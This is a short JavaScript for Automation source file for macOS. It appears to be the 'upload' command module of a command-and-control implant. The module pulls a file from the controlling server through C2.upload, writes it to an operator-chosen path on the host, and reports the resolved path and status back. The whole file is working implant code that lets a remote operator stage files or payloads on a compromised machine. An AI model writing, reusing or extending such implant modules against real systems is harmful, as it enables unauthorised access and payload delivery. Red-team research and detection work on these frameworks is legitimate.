exports.upload = function(task, command, params){
    try{
        let config = JSON.parse(params);
        let full_path  = config['remote_path'];
        let data = "Can't find 'file' or 'file_id' with non-blank values";
        let file_id = "";
        if(config.hasOwnProperty('file') && config['file'] !== ""){
            data = C2.upload(task, config['file'], "");
            file_id = config['file']
        }else if(config.hasOwnProperty('file_id') && config['file_id'] !== ""){
            data = C2.upload(task, config['file_id'], "");
            file_id = config['file_id'];
        }
        if(typeof data === "string"){
            return {"user_output":String(data), "completed": true, "status": "error"};
        }
        else{
            data = write_data_to_file(data, full_path);
            try{
	            let fm = $.NSFileManager.defaultManager;
	            let pieces = ObjC.deepUnwrap(fm.componentsToDisplayForPath(full_path));
	            //console.log(pieces);
	            full_path = "/" + pieces.slice(1).join("/");
	        }catch(error){
	            return {'status': 'error', 'user_output': error.toString(), 'completed': true};
	        }
            return {"user_output":String(data), "completed": true, 'full_path': full_path, "file_id": file_id};
        }
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
COMMAND_ENDS_HERE